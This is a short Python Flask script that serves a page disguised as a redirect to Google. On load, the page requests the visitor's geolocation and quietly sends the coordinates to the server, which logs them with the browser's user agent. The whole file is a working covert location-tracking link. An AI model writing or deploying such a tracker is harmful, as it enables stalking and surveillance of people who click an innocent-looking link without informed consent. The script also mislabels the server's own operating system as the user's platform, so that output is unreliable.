from flask import Flask, request
import requests
import platform

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var url = "/location?lat=" + lat + "&lon=" + lon;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.send();
    }

    function redirectToLocation(location = "https://www.google.com/") {
        getLocation();
        window.location.href = location;
    }
    </script>
    </head>
    <body onload="redirectToLocation()" >
    </body>
    </html>
    '''


@app.route('/location')
def location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    user_agent = request.headers.get('User-Agent')
    system = platform.system()
    release = platform.release()
    print(f"User's location: {lat}, {lon}")
    print(f"User's device information: {user_agent}")
    print(f"User's platform: {system} {release}")
    # You can do something with the location data here
    return "Location received"

app.run()